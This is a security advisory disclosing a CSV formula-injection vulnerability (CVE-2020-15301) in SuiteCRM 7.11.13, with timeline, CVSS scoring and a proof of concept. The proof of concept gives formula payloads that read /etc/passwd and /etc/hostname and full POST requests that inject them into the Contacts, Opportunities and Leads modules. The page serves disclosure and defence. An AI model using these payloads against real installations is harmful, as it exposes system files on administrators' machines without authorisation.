=== Content from www.wizlynxgroup.com_6506fb2b_20250119_120333.html ===


[![wizlynx group | IT Security Services](/content/images/logo-nav.png)](/ch/de/)

[Contact Us](../../contact)

# Security Research & Advisories

### CSV Injection Vulnerability in SuiteCRM

| Vendor |  |
| --- | --- |
| Product | SuiteCRM |
| Affected Version(s) | 7.11.13 and probably prior and probably prior |
| Tested Version(s) | 7.11.13 |
| Vendor Notification | 10 June 2020 |
| Advisory Publication | 10 June 2020 [without technical details] |
| Vendor Fix | 7.11.17 |
| Public Disclosure | 05 November 2020 |
| Latest Modification | 05 November 2020 |
| CVE Identifier | [CVE-2020-15301](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15301) |
| Product Description | SuiteCRM is a software fork of the popular Customer Relationship Management (CRM) system SugarCRM, developed and maintained by SalesAgility. It is a free and open source alternative application |
| Credits | Luis Noriega, Security Researcher & Penetration Tester @wizlynx group |

## **Vulnerability Details**

| **CSV Injection Vulnerability** | | | |
| --- | --- | --- | --- |
| **Severity**: **Medium** | **CVSS Score**: 5.4 | **CWE-ID**: [CWE-74](https://cwe.mitre.org/data/definitions/74) | **Status**: Open |
| **Vulnerability Description** | | | |
| The application SuiteCRM is affected by a CSV injection vulnerability (aka Formula Injection) affecting version 7.11.13 and probably prior versions. An attacker can use the Accounts, Contacts, Opportunities or Leads modules to inject malicious payloads in the registration fields. When an authenticated administrator uses the Download Import File Template feature to export the details of all registers into a CSV file and open it, the payload gets executed. | | | |
| **CVSS Base Score** | | | |
| **Attack Vector** | Network | **Scope** | Changed |
| **Attack Complexity** | Low | **Confidentiality Impact** | Low |
| **Privileges Required** | Low | **Integrity Impact** | Low |
| **User Interaction** | Required | **Availability Impact** | None |

## **PoC**

### Description

SuiteCRM
application has a CSV injection vulnerability due to the lack of content
validation when the application embeds inputs inside CSV files. An attacker can
use the Accounts, Contacts, Opportunities or Leads modules to inject malicious
payloads in the registration fields. When an authenticated administrator uses
the *Download Import File Template* featureto export the details
of all registers into a CSV file and open it, the payload gets executed.

The following payloads were used for exploiting the vulnerability.

='file:///etc/passwd'#$passwd.A1
='file:///etc/hostname'#$hostname.A1

### Exploitation Process

The following screenshot shows the âAccountsâ module which let admin users to create new accounts. As it can be seen, the yellow-highlighted fields have been populated using CSV injection payloads (starts with â=â symbol).

![](/content/images/vuln/S4HTEK724XPV.png)

The screenshot below shows the POST request made to the server with the payloads shown above.

![](/content/images/vuln/45UV7ISNOENN.png)

The screenshot below shows the new account created (yellow-highlighted). As it can be seen, the application does not sanitize the payloads starting the â=â symbol.

![](/content/images/vuln/P1KG09IAUR8N.png)

As demonstration, the accounts details have been downloaded using the âDownload Import File Templateâ feature as an admin user. This process was performed in the system that hosts the SuiteCRM application.

![](/content/images/vuln/G97GOSW4UQ0O.png)

For this demo, Libre Office application was used to open the Accounts.csv file. When the user tries to open the file, he/she will be prompted for an action as shown in the following screenshot to import the content.

![](/content/images/vuln/4YVALBOT0TY6.png)

After that, the file gets open. As it can be seen the payload got executed and the content of the /etc/passwd and /etc/hostname files are shown into the name and website fields, respectively.

![](/content/images/vuln/R489IFKTLS8X.png)
### Other affected pages & parameters

Contacts Module

POST
/SuiteCRM-7.11.13/index.php HTTP/1.1
Host: localhost

User-Agent:
Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language:
en-US,en;q=0.5
Accept-Encoding:
gzip, deflate
Referer:
http://localhost/SuiteCRM-7.11.13/index.php?action=ajaxui
Content-Type:
multipart/form-data; boundary=---------------------------34457625816576156072127013256
Content-Length:
6815
Connection:
close
Cookie:
sugar\_user\_theme=SuiteP; ck\_login\_id\_20=1; ck\_login\_language\_20=en\_us;
PHPSESSID=5godhdu05r7l0q1gircoon0q1bUpgrade-Insecure-Requests:
1

-----------------------------34457625816576156072127013256 Content-Disposition:
form-data; name="module"
Contacts
...
-----------------------------34457625816576156072127013256
Content-Disposition:
form-data; name="first\_name"
=1336+1
-----------------------------34457625816576156072127013256
Content-Disposition:
form-data; name="last\_name"

='file:///etc/passwd'#$passwd.A1
-----------------------------34457625816576156072127013256

Content-Disposition:
form-data; name="phone\_work"

=1+2
-----------------------------34457625816576156072127013256

Content-Disposition:
form-data; name="phone\_mobile"

-----------------------------34457625816576156072127013256
Content-Disposition:
form-data; name="title"
='file:///etc/hostame'#$hostname.A1
-----------------------------34457625816576156072127013256

Content-Disposition:
form-data; name="department"

Opportunities Module

POST
/SuiteCRM-7.11.13/index.php HTTP/1.1
Host: localhost

User-Agent:
Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language:
en-US,en;q=0.5
Accept-Encoding:
gzip, deflate

Referer:
http://localhost/SuiteCRM-7.11.13/index.php?action=ajaxui
Content-Type:
application/x-www-form-urlencoded

Content-Length:
547
Connection:
close

Cookie:
sugar\_user\_theme=SuiteP; ck\_login\_id\_20=1; ck\_login\_language\_20=en\_us;
PHPSESSID=5godhdu05r7l0q1gircoon0q1b
Upgrade-Insecure-Requests:
1

module=Opportunities&record=&isDuplicate=false&action=Save&return\_module=Opportunities&return\_action=DetailView&return\_id=&module\_tab=&contact\_role=&relate\_to=Opportunities&relate\_id=&offset=1&name=%3D%27file%3A%2F%2F%2Fetc%2Fpasswd%27%23%24passwd.A1&account\_name=Luis&account\_id=546e014e-2429-6e3d-7afd-5ede65613d1f&currency\_id=-99&date\_closed=06%2F02%2F2020&amount=122323&opportunity\_type=&sales\_stage=Prospecting&lead\_source=&probability=10&campaign\_name=&campaign\_id=&next\_step=%3D1%2B4&description=&assigned\_user\_name=admin&assigned\_user\_id=1

Leads Module

POST
/SuiteCRM-7.11.13/index.php HTTP/1.1
Host: localhost

User-Agent:
Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language:
en-US,en;q=0.5
Accept-Encoding:
gzip, deflate

Referer:
http://localhost/SuiteCRM-7.11.13/index.php?action=ajaxui
Content-Type:
multipart/form-data; boundary=---------------------------6926285227250051811612406990

Content-Length:
6982
Connection:
close

Cookie:
sugar\_user\_theme=SuiteP; ck\_login\_id\_20=1; ck\_login\_language\_20=en\_us;
PHPSESSID=5godhdu05r7l0q1gircoon0q1b
Upgrade-Insecure-Requests:
1
-----------------------------6926285227250051811612406990

Content-Disposition:
form-data; name="module"
Leads
-----------------------------6926285227250051811612406990

Content-Disposition:
form-data; name="record"

-----------------------------6926285227250051811612406990
Content-Disposition:
form-data; name="last\_name"

='file:///etc/passwd'#$passwd.A1
-----------------------------6926285227250051811612406990

Content-Disposition:
form-data; name="phone\_work"

=1+2
-----------------------------6926285227250051811612406990

Content-Disposition:
form-data; name="title"

='file:///etc/hostame'#$hostname.A1
-----------------------------6926285227250051811612406990

Content-Disposition:
form-data; name="phone\_mobile"

=1+2

[Top](#0)

![wizlynx group | IT Security Services](/content/images/WhiteWithRed.png)

wizlynx has not only built a solid foundation of information security, quality and project management know-how, but our associates are known for their ability to apply the right soft skills at the right time to best serve our customers. We make it a point to understand the infrastructure, needs and challenges of our customers, which enables us to deliver fast, effective and high quality results. It is our belief that this level of understanding can only be obtained with the most capable and experienced resources. Reach out to our associates at any time through our interactive competence centers to draw upon our knowledge of processes, procedures, guidelines and tools. Youï¿½ll be able to see, firsthand, the value our team will add to your organization.

---

---

©2024 wizlynx group - All Rights Reserved

* [Terms of Use](/terms-of-use)
* [Privacy](/privacy)


